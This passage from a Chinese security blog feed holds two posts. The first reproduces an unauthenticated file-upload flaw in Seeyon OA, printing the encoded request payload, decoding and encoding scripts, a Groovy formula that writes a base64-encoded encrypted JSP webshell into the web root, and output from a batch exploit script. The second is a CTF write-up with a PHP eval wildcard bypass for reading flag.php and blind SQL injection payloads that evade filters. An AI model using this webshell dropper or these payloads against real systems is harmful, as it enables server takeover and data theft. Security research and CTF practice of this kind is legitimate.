3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00"</span>).decode(<span class="string">"utf-8"</span>).encode(<span class="string">'unicode-escape'</span>).decode(<span class="string">'string_escape'</span>)</div><div class="line"><span class="keyword">print</span> zlib.decompress(urllib.unquote(gzip_data), zlib.MAX_WBITS|<span class="number">16</span>)</div></pre></td></tr></table></figure><p>脚本会出现<code>zlib.error: Error -3 while decompressing data: invalid bit length repeat</code>的错误</p><p><img src="http://pic.c1imber.top/blog/20210122/nCH6Un7MR3Ka.png?imageslim" alt="mark"></p><p>所以这里应该把payload当中写错的+换成%20</p><p>正确的解码脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zlib</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line">gzip_data = urllib.unquote(<span class="string">"%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D%20c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00"</span>).decode(<span class="string">"utf-8"</span>).encode(<span class="string">'unicode-escape'</span>).decode(<span class="string">'string_escape'</span>)</div><div class="line"><span class="keyword">print</span> zlib.decompress(urllib.unquote(gzip_data), zlib.MAX_WBITS|<span class="number">16</span>)</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210122/QfMTUXomh0uR.png?imageslim" alt="mark"></p><p>获得：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[&#123;<span class="string">'formulaType'</span>: <span class="number">1</span>, <span class="string">'formulaName'</span>: <span class="string">'test'</span>, <span class="string">'formulaExpression'</span>: <span class="string">'String path = "../webapps/seeyon/";</span></div><div class="line"><span class="string">      java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"SeeyonUpdate1.jspx");</span></div><div class="line"><span class="string">       String shell = "PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5TdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYygoc2Vzc2lvbi5nZXRWYWx1ZSgidSIpKyIiKS5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+";</span></div><div class="line"><span class="string">       sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();</span></div><div class="line"><span class="string">       String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");</span></div><div class="line"><span class="string">       printWriter2.println(decodeString);</span></div><div class="line"><span class="string">       printWriter2.close();&#125;;test();def static xxx()&#123;'</span>&#125;, <span class="string">''</span>, &#123;&#125;, <span class="string">'true'</span>]</div></pre></td></tr></table></figure><h3 id="arguments参数编码"><a href="#arguments参数编码" class="headerlink" title="arguments参数编码"></a>arguments参数编码</h3><p>知道了解码的方法，很容易写出编码脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zlib</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">filename=<span class="string">"test.log"</span></div><div class="line">shell=base64.b64encode(<span class="string">"test"</span>)</div><div class="line">org=<span class="string">'''[&#123;'formulaType': 1, 'formulaName': 'test', 'formulaExpression': 'String path = "../webapps/seeyon/";\n       \tjava.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"%s");\n        String shell = "%s";\n        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();\n        String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");\n        printWriter2.println(decodeString);\n        printWriter2.close();&#125;;test();def static xxx()&#123;'&#125;, '', &#123;&#125;, 'true']'''</span>%(filename,shell)</div><div class="line">gzip_compress = zlib.compressobj(<span class="number">9</span>, zlib.DEFLATED, zlib.MAX_WBITS|<span class="number">16</span>)</div><div class="line">gzip_data = gzip_compress.compress(org) + gzip_compress.flush()</div><div class="line"><span class="keyword">print</span> urllib.quote(gzip_data.encode(<span class="string">'string_escape'</span>).decode(<span class="string">'unicode-escape'</span>).encode(<span class="string">'utf-8'</span>))</div></pre></td></tr></table></figure><p>这样就可以控制想要上传的文件名和文件内容了</p><p><img src="http://pic.c1imber.top/blog/20210122/SYsofRLxXgUX.png?imageslim" alt="mark"></p><p>漏洞利用成功会返回{“message”:null,”code”:”xxxxx”,”details”:null}</p><p>利用失败会返回{“message”:”被迫下线，原因：与服务器失去连接”,”code”:”-1”,”details”:null}</p><p>批量检测利用脚本效果</p><pre><code>Usage: seeyon_getshell.py [options]Options:     -h, --help  show this help message and exit     -f FILE     -f file     -u URL      -u url</code></pre><p><img src="http://pic.c1imber.top/blog/20210122/AXvR3JKX9HgW.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;最早流传的payload&quot;&gt;&lt;a href=&quot;#最早流传的payload&quot; class=&quot;headerlink&quot; title=&quot;最早流传的payload&quot;&gt;&lt;/a&gt;最早流传的payload&lt;/h1&gt;&lt;p&gt;来自狼组知识库（谷歌快照）&lt;/p&gt;
&lt;p&gt;漏洞概述：前台ge
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全竞赛线下个人赛wp</title>
    <link href="https://c1aysec.github.io/2021/01/15/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E7%BA%BF%E4%B8%8B%E4%B8%AA%E4%BA%BA%E8%B5%9Bwp/"/>
    <id>https://c1aysec.github.io/2021/01/15/2020全国电信和互联网行业网络安全竞赛线下个人赛wp/</id>
    <published>2021-01-15T06:48:40.880Z</published>
    <updated>2021-01-15T08:00:02.088Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>12月份参加的线下赛，补一下，个人赛成绩不怎么好，在这记录一下</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p><strong>web3:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="comment">//flag is located in flag.php</span></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) )&#123;</div><div class="line">    $a = $_GET[<span class="string">'a'</span>];</div><div class="line">    <span class="keyword">if</span>( strlen($a)&gt;<span class="number">27</span> )&#123;</div><div class="line">        <span class="keyword">die</span>(strval(strlen($a)) . <span class="string">" Long."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>( preg_match(<span class="string">"/[A-Zb-z0-9_$.&amp;;|^~![\]()&#123;&#125;\$@\*]+/"</span>, $a) )&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</div><div class="line">    &#125;</div><div class="line">   <span class="keyword">eval</span>(<span class="string">"echo '"</span> . $a .<span class="string">"';"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>安恒17年月赛出过类似的</p><p>过滤了<code>^~</code>等，导致不能异或取反绕过</p><p>过滤了<code>[]@</code>等字符，导致不能上传临时文件使用通配符匹配临时文件执行的方式（p牛之前提出的方法）</p><p>之前也看过一叶飘零师傅提供的方法：</p><p>是构造</p><pre><code>&apos;?&gt;&lt;?=`/???/??? ????????`?&gt;</code></pre><p>‘是为了闭合这里代码里的echo，之后使用?&gt;闭合之前的代码，&lt;?=?&gt;这里起到了echo的作用</p><p>这里的/???/??? ????????是为了匹配到<code>/bin/cat flag.php</code></p><p>但是这样直接发过去目标会被卡死，因为匹配到的结果有很多</p><p>仔细看代码发现没有过滤a，于是可以通过以下的方式</p><pre><code>&apos;?&gt;&lt;?=`/???/?a? ??a?????`?&gt;</code></pre><p>访问</p><pre><code>http://10.10.22.12/?a=%27?%3E%3C?=`/???/?a?%20??a?????`?%3E</code></pre><p><img src="http://pic.c1imber.top/blog/20210115/6pvr0W6UFWmt.png?imageslim" alt="mark"></p><p>获取flag:<br>flag{ZqhzwSifav4zf2ejop2ieKqxwQaEBOXf}</p><p><strong>web1:</strong></p><p>没做出，说一下思路</p><p>打开题目说需要登录</p><p><img src="http://pic.c1imber.top/blog/20210115/wNNLLKTxEFRC.png?imageslim" alt="mark"></p><p>这里过滤了很多字符，例如<code>or、in、空格、=、&gt;、&lt;、like、^、regexp、substr、mid、right等等</code></p><p>登录很好构造，构造下面的payload就可以登录成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,2,3%23&amp;password=</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210115/Ub94hMeMfIK5.png?imageslim" alt="mark"></p><p>这里还输出了sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM users WHERE username=&apos;&apos;UNION/**/SELECT/**/1,2,3#&apos; and passwd=&apos;&apos;;</div></pre></td></tr></table></figure><p>猜测后端逻辑大概是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='"</span>.$_POST[username].<span class="string">"' and passwd='"</span>.$_POST[password].<span class="string">"'"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line"><span class="keyword">if</span>(mysql_num_rows($result)&gt;<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"welcome Admin!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到这里登录成功后除了welcome Admin!之外什么也没有</p><p>盯着题目看了好久无从下手，只能换个思路尝试盲注，当时首先想到的是时间盲注</p><p>发现sleep被过滤了、这里通过<code>benchmark(10000000,md5(1))</code>可以绕过</p><p><img src="http://pic.c1imber.top/blog/20210115/UX5LfKuCV15h.png?imageslim" alt="mark"></p><p>于是可以通过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if(1,benchmark(10000000,md5(1)),1),3%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;延时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if(0,benchmark(10000000,md5(1)),1),3%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;正常响应</p><p>这样的方式去进行时间盲注判断</p><p>这里需要突破的两个地方：<br>1、过滤了<code>=、&gt;、&lt;、^、like、regexp</code>等字符，如何构造布尔逻辑判断<br>2、过滤了<code>substr、mid、in、right</code>等，如何逐位截取字符串</p><p>突破第一点：</p><p>方法一：</p><p>经过测试找到方法，可以通过/除号进行布尔逻辑判断，这里通过<code>cast(除法运算结果 as char(1))</code>可以将运算结果转为0和1，由此就可以解决构造布尔判断的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(version());</div><div class="line">+------------------+</div><div class="line">| ascii(version()) |</div><div class="line">+------------------+</div><div class="line">|               53 |</div><div class="line">+------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select cast(ascii(version())/52 as char(1));</div><div class="line">+--------------------------------------+</div><div class="line">| cast(ascii(version())/52 as char(1)) |</div><div class="line">+--------------------------------------+</div><div class="line">| 1                                    |</div><div class="line">+--------------------------------------+</div><div class="line">1 row in set, 1 warning (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select cast(ascii(version())/53 as char(1));</div><div class="line">+--------------------------------------+</div><div class="line">| cast(ascii(version())/53 as char(1)) |</div><div class="line">+--------------------------------------+</div><div class="line">| 1                                    |</div><div class="line">+--------------------------------------+</div><div class="line">1 row in set, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select cast(ascii(version())/54 as char(1));</div><div class="line">+--------------------------------------+</div><div class="line">| cast(ascii(version())/54 as char(1)) |</div><div class="line">+--------------------------------------+</div><div class="line">| 0                                    |</div><div class="line">+--------------------------------------+</div><div class="line">1 row in set, 1 warning (0.00 sec)</div></pre></td></tr></table></figure><p>获取表名，这里就能够成功获取到当前数据库<code>group_concat(table_name)</code>的第一个字符和长度了</p><p>因为这里过滤了<code>in</code>，所以用<code>sys.schema_table_statistics代替information_schema</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/length(group_concat(table_name))/**/from/**/sys.schema_table_statistics)/14)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;延时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/length(group_concat(table_name))/**/from/**/sys.schema_table_statistics)/15)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;正常响应</p><p>所以当前数据库表名长度为14</p><p><img src="http://pic.c1imber.top/blog/20210115/wwqnoC6ODPQ2.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210115/2NTpYxjAQUG4.png?imageslim" alt="mark"></p><p>第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/ascii(left(group_concat(table_name),1))/**/from/**/sys.schema_table_statistics)/117)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=1</div></pre></td></tr></table></figure><p>-&gt;延时</p><p><img src="http://pic.c1imber.top/blog/20210115/IFhE8uUmvff9.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/ascii(left(group_concat(table_name),1))/**/from/**/sys.schema_table_statistics)/118)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=1</div></pre></td></tr></table></figure><p>-&gt;正常响应</p><p><img src="http://pic.c1imber.top/blog/20210115/XB5cXeEVrjWq.png?imageslim" alt="mark"></p><p>判断出<code>group_concat(table_name)</code>第一个字符的ascii码为117,也就是u</p><p>方法二：</p><p>使用between and</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div 